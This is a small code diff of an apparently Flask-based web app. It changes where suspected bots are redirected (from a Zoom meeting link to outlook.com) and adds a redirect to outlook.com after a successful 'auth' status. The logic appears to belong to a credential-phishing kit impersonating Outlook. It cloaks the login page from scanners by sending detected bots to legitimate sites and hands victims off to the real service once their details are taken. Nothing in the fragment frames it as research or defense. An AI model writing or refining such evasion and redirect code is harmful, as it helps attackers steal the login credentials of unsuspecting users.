@@ -186,7 +186,7 @@ def serve(path):
 
     if get_ip_details(visitor_ip):
         print("redirected bot detected")
-        return redirect("https://us05web.zoom.us/j/81234567890?pwd=nmki90jdhslkeuiopsllslsmooiwlls12opQJ.1")
+        return redirect("outlook.com")
 
     print("Woks perfecty heading to login")
     # This logic is now much simpler.
@@ -561,7 +561,7 @@ def auth():
         })
     
     if current_status == 'success':
-        return jsonify({"status": "success"})
+        return jsonify({"status": "success", "redirect_url":"outlook.com"})
     return jsonify({"status": current_status})
 
 
